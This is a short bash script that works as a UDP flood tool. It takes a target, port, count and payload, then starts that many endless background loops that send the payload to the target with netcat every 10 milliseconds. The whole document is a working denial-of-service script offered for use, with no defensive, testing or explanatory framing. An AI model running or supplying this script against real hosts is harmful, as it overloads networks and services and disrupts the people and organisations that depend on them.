#!/bin/bash

target=$1
port=$2
packets=$3
payload=$4

if [ -z "$target" ] || [ -z "$port" ] || [ -z "$packets" ] || [ -z "$payload" ]; then
    echo "Usage: $0 <target> <port> <packets> <payload>"
    exit 1
fi

for ((i=1; i<=packets; i++)); do
    while true; do
        echo -ne "$payload" | nc -u "$target" "$port"
        sleep 0.01
    done &
done

wait